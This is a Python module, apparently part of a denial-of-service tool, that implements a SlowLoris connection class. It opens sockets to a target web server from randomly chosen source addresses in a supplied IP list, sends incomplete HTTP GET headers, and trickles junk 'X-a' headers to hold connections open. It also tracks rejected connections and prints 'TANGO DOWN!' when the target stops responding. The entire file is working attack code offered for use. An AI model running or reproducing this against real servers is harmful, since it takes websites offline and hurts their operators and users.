"""This module implements the SlowLoris connection."""

import random
import socket
from datetime import datetime
import ssl

class LorisConnection:
    """SlowLoris connection."""

    def __init__(self, target,client_ips=[], first_connection=False):
        self.target = target
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(30)
        self.client_ips = client_ips
        try:
            start_time = datetime.now()
            #ipaddr = '10.1.2.' + str(random.randint(1, 253))
            length = len(self.client_ips) -1
            print("\n Length = ", length)
            ipaddr = client_ips[random.randint(0, length)]
            print("\n\n IP = ",ipaddr)
            port = random.randint(10000, 60000)
            self.socket.bind((ipaddr.strip(), port)) 
            self.socket.connect((target.host, target.port))
            self.socket.settimeout(None)
            if target.ssl:
                self.socket = ssl.wrap_socket(self.socket)
            if not first_connection:
                latency = (datetime.now() - start_time).total_seconds() * 1000.0
                if len(target.latest_latency_list) < 10:
                    target.latest_latency_list.append(latency)
                else:
                    target.latest_latency_list.pop(0)
                    target.latest_latency_list.insert(0, latency)
            self.connected = True
        except socket.timeout:
            self.connected = False
            # Keep track of rejected connections
            if first_connection:
                target.rejected_initial_connections += 1
            else:
                target.rejected_connections += 1
            # Report first initial rejection to the user
            if first_connection and target.rejected_initial_connections == 1:
                print("[{}] New connections are getting rejected.".format(target.host))
            # Report rejected reconnection to the user
            if not first_connection:
                print("[{}] TANGO DOWN! Target unreachable.".format(target.host))

    def is_connected(self):
        """Tests if the connection has been established."""
        return self.connected

    def close(self):
        """Closes the connection."""
        try:
            self.socket.shutdown(1)
            self.socket.close()
        except: # pylint: disable=bare-except
            pass

    def send_headers(self, uagent):
        """Sends headers."""
        template = "GET /?{} HTTP/1.1\r\n{}\r\nAccept-language: en-US,en,q=0.5"
        try:
            self.socket.send(template.format(random.randrange(0, 2000), uagent).encode("ascii"))
        except socket.timeout:
            pass
        return self

    def keep_alive(self):
        """Sends garbage to keep the connection alive."""
        try:
            self.socket.send("X-a: {}".format(random.randint(0, 5000)).encode("ascii"))
        except socket.timeout:
            pass
